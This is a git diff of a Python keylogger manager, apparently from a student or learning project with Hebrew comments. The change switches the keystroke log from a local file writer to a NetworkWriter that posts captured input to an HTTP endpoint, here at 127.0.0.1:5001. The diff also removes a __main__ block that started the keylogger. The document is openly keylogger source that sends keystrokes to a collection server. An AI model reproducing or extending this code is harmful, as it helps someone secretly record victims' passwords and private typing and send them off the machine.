@@ -4,6 +4,10 @@ from KeyLoggerService import KeyLoggerService
 from FileWriter import FileWriter
 from Encryptor import Encryptor as crp
 import os
+from  Iwriter import IWriter
+
+from agent.NetworkWriter import NetworkWriter
+
 
 class KeyLoggerManager:
     def __init__(self, interval_seconds: int, machine_name: str = "log"):
@@ -14,7 +18,7 @@ class KeyLoggerManager:
         self.interval = interval_seconds
         self.machine_name = machine_name
         self.logger = KeyLoggerService(on_escape_callback = self.stop)
-        self.writer = FileWriter()
+        self.writer: IWriter = NetworkWriter("http://127.0.0.1:5001")
         self.running = False
         self.thread = None
 
@@ -46,24 +50,5 @@ class KeyLoggerManager:
             os._exit(0)  # יציאה מיידית מכל התוכנית
 
 
-# דוגמה לשימוש
-# if __name__ == "__main__":
-#     manager = KeyLoggerManager(interval_seconds=5, machine_name="DANIEL")
-#     manager.start()
-#     print("Keylogger started, לחץ ESC לעצירה...")
-#     try:
-#         while True:
-#             time.sleep(1)
-#     except KeyboardInterrupt:
-#         manager.stop()
-#     print("Keylogger stopped.")
-if __name__ == "__main__":
-    manager = KeyLoggerManager(interval_seconds=5, machine_name="DANIEL")
-    manager.start()
-    print("Keylogger started, לחץ ESC לעצירה...")
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        manager.stop()
+
 
